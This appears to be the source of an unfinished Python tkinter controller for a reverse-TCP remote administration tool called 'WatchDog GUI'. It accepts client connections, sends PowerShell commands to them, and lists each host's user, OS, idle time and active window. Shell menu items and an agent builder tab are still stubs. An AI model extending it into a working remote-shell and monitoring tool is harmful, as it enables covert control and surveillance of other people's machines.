import tkinter as tk
from tkinter import ttk
from tkinter import messagebox


import time
import socket
import threading
from datetime import datetime
            


class WatchDogGUI:
    def __init__(self, root):
        self.root = root

        self.Version = "0.1.0"
        self.root.title(f"WatchDog GUI {self.Version}")
        self.root.geometry("900x480")


        self.running = True
        self.isListening = False

        self.socket_timeout_Server = 5
        self.socket_timeout_clients = 5

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(self.socket_timeout_Server)

        lo = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        lo.connect(("8.8.8.8", 80))

        self.IP = lo.getsockname()[0]
        self.PORT = 5050

        self.data_clients = []


        self.IP_Entry = tk.StringVar()

        
        # Create main notebook (tabs container)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True)

        # Create tabs
        self.create_connections_tab()
        self.create_local_settings_tab()
        self.create_agent_builder_tab()
        self.create_event_log_tab()
        self.create_about_tab()

        # Create status bar
        self.status_bar = tk.Label(root, text="Listening: False", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)


        threading.Thread(target=self.ListeningForClients).start()
        threading.Thread(target=self.PingEveryClients).start()

    def create_connections_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Connections")

        # Create treeview
        columns = ("location", "assigned_name", "computer_user", "os", "uptime", "idle_time", "active_window")
        self.tree = ttk.Treeview(tab, columns=columns, show='headings')

        # Define headings
        self.tree.heading("location",      text="Location")
        self.tree.heading("assigned_name", text="Assigned Name")
        self.tree.heading("computer_user", text="Computer/User")
        self.tree.heading("os",            text="Operation System")
        self.tree.heading("uptime",        text="System Uptime")
        self.tree.heading("idle_time",     text="Idle time")
        self.tree.heading("active_window", text="Active Window")

        # Set column widths
        self.tree.column("location",      width=120)
        self.tree.column("assigned_name", width=120)
        self.tree.column("computer_user", width=150)
        self.tree.column("os",            width=150)
        self.tree.column("uptime",        width=70)
        self.tree.column("idle_time",     width=70)
        self.tree.column("active_window", width=180)

        # Add sample data (replace with real data)
        """self.tree.insert('', tk.END, values=(
            "192.168.1.100",
            "Client-01",
            "DESKTOP-ABC123/User1",
            "Windows 10 Pro 64-bit",
            "2 hours",
            "00:01:23",
            "Google Chrome"
        ))"""


        """
        # Add more sample entries
        for i in range(2, 6):
            self.tree.insert('', tk.END, values=(
                f"192.168.1.10{i}:6565",
                f"Client-0{i}",
                f"DESKTOP-DEF45{i}/User{i}",
                "Windows 11 Pro 64-bit",
                f"{i} days {i}:3{i}:12",
                f"00:0{i}:23",
                "Microsoft Word"
            ))
        """

        self.tree.pack(fill='both', expand=True)

        # Add context menu
        self.context_menu = tk.Menu(self.root, tearoff=0)
        self.context_menu.add_command(label="shell1")
        self.context_menu.add_command(label="shell2")
        self.context_menu.add_command(label="shell3")
        self.context_menu.add_command(label="shell4")
        self.context_menu.add_command(label="shell5")
        self.context_menu.add_command(label="Host Info")
        self.context_menu.add_command(label="Disconnect", command=self.on_disconnect)
        self.tree.bind("<Button-3>", self.show_context_menu)

    def create_local_settings_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Local Settings")
        # Add local settings content here
        #label = ttk.Label(tab, text="Local Settings Configuration")
        #label.pack(pady=20)

        # self.start_btn = ttk.Button(control_frame, text="Start Server", command=self.start_server)
        # self.start_btn.pack(side=tk.LEFT, padx=5)
        # self.stop_btn = ttk.Button(control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        # self.stop_btn.pack(side=tk.LEFT, padx=5)

        tp_text = ttk.Label(tab, text="IP:")
        tp_text.place(x=5, y=20)
        ip = ttk.Entry(tab)
        ip.place(x=45, y=20)
        ip.insert(0, self.IP)

        port_text = ttk.Label(tab, text="PORT:")
        port_text.place(x=5, y=50)
        port = ttk.Entry(tab)
        port.place(x=45, y=50)
        port.insert(0, str(self.PORT))

        self.start_server_button = ttk.Button(tab, text="Start Server", command=self.StartUpServer)
        self.start_server_button.place(x=5, y=80)

        self.stop_server_button = ttk.Button(tab, text="Stop Server", command=self.StopServer, state=tk.DISABLED) 
        self.stop_server_button.place(x=5, y=110)

    def create_about_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="About")
        # Add about content here
        label = ttk.Label(tab, text=f"WatchDog GUI\nVersion {self.Version}\n\n(c) 2025 WatchDog")
        label.pack(pady=20)
        about_text = """
        Features:
            - Reverse TCP Connections
            - Multi-Client Management
            - Real-time Monitoring
            - Cross-platform Support
        """
        ttk.Label(tab, text=about_text, justify=tk.LEFT).pack(pady=20, padx=20)

    def create_agent_builder_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Agent Builder")
        # Add agent builder content here
        label = ttk.Label(tab, text="Agent Builder Configuration")
        label.pack(pady=20)

    def create_event_log_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Event Log")
        # Add event log content here
        self.log_text = tk.Text(tab, wrap=tk.WORD)
        scrollbar = ttk.Scrollbar(tab, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        
        self.log_text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        # self.log_text.insert(tk.END, "[2024-03-20 14:30:45] Server started\n")
        # self.log_text.insert(tk.END, "[2024-03-20 14:31:12] Client connected: 192.168.1.100\n")
        # self.log_text.insert(tk.END, "[2024-03-20 14:32:01] Command executed: screenshot\n")

        # self.log_text.config(state=tk.DISABLED)

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def on_disconnect(self):
        selected_items = self.tree.selection()
        if selected_items:
            item_id = selected_items[0]
            index = self.tree.index(item_id)
            self.tree.delete(item_id)

            self.AddLogs(f"Manually disconnected client {self.data_clients[index][1]}, Row {index}")
            self.SendMessage(index, "; exit")
            self.data_clients.pop(index)

        """
        selected_item = self.tree.selection()
        if selected_item:
            self.tree.delete(selected_item)
            index = self.tree.index(selected_item)
            self.AddLogs(f"Manuel disconnect client {selected_item}, Row {index}")
        """




















    def GetDataAndTime(self):
        now = datetime.now()
        return now.strftime("[%Y-%m-%d %H:%M:%S]")
    
    def AddLogs(self, text):
        print(f"{self.GetDataAndTime()} {text}")
        self.log_text.insert(tk.END, f"{self.GetDataAndTime()} {text}\n")


    def StartUpServer(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(2)

        self.s.bind((self.IP, self.PORT))
        self.s.listen()
        self.AddLogs(f"Start Server: {self.IP}:{self.PORT}")

        self.isListening = True

        self.status_bar.config(text=f'Listening: {self.IP}')

        self.start_server_button.config(state=tk.DISABLED)
        self.stop_server_button.config(state=tk.NORMAL)

    def StopServer(self):
        self.s.close()
        self.AddLogs("Stop Server")
        self.isListening = False

        self.status_bar.config(text=f'Listening: False')

        self.stop_server_button.config(state=tk.DISABLED)
        self.start_server_button.config(state=tk.NORMAL)

        for pp in self.data_clients:
            pp[0].close()
            self.data_clients.remove(pp)
        
        for item in self.tree.get_children():
            self.tree.delete(item)
            self.AddLogs(f"disconnect client {item}")


    def ListeningForClients(self):
        while self.running:
            if self.isListening:
                try:
                    try:
                        conn, addr = self.s.accept()
                        conn.settimeout(self.socket_timeout_clients)  # 2 seconds timeout
                        self.data_clients.append([conn, addr[0]])
                        # print(f"Client Connect: {[conn, addr[0]]}")
                        self.AddLogs(f"Client Connect: {addr[0]} PORT: {addr[1]}")

                        """self.tree.insert('', tk.END, values=(
                            addr[0],
                            "Client-01",
                            "DESKTOP-ABC123/User1",
                            "Windows 10 Pro 64-bit",
                            "2 hours",
                            "00:01:23",
                            "Google Chrome"
                        ))"""

                    except socket.timeout:
                        pass
                except:
                    pass
            else:
                time.sleep(2)

    

    def sync_tree_with_list(self):
        tree_items = self.tree.get_children()
        tree_names = [self.tree.item(item, "values")[0] for item in tree_items]

        # Add missing names from list to Treeview
        for name in self.data_clients:
            if name[1] not in tree_names:
                self.tree.insert('', tk.END, values=(
                            name[1],
                            "Client-01",
                            "DESKTOP-ABC123/User1",
                            "Windows 10 Pro 64-bit",
                            "2 hours",
                            "00:01:23",
                            "Google Chrome"
                        ))
                # print(f"Added: {name}")

        # Remove names from Treeview that aren't in the list
        client_names = [name[1] for name in self.data_clients]

        # Remove names from Treeview that aren't in self.data_clients
        for item_id in tree_items:
            name_in_tree = self.tree.item(item_id, "values")[0]
            if name_in_tree not in client_names:
                self.tree.delete(item_id)
                # print(f"Removed: {name_in_tree}")


    
    def PingEveryClients(self):
        ping_time = time.time()

        while self.running:
            if self.isListening:

                if (time.time() - ping_time) > 10:
                    ping_time = time.time()
                    print("ping")

                    for i in range(len(self.data_clients)):
                        if not self.cmd_test_connection(i):
                            self.AddLogs(f"Client Lost connect: {self.data_clients[i][1]}")
                            self.data_clients.pop(i)

                self.sync_tree_with_list()


            time.sleep(2)

    
    def SendMessage(self, index, message):
        self.data_clients[index][0].send(bytes(message, "utf-8"))

    
    def GetMessage(self, index, messagesize):
        return self.data_clients[index][0].recv(messagesize).decode("utf-8")


    def cmd_test_connection(self, index):
        try:
            try:
                self.data_clients[index][0].send(bytes("Write-Output 'ping'", "utf-8"))
                self.data_clients[index][0].recv(64).decode("utf-8")
                return 1
            except socket.timeout:
                return 0
        except:
            return 0

if __name__ == "__main__":
    root = tk.Tk()
    app = WatchDogGUI(root)
    root.mainloop()
    exit()
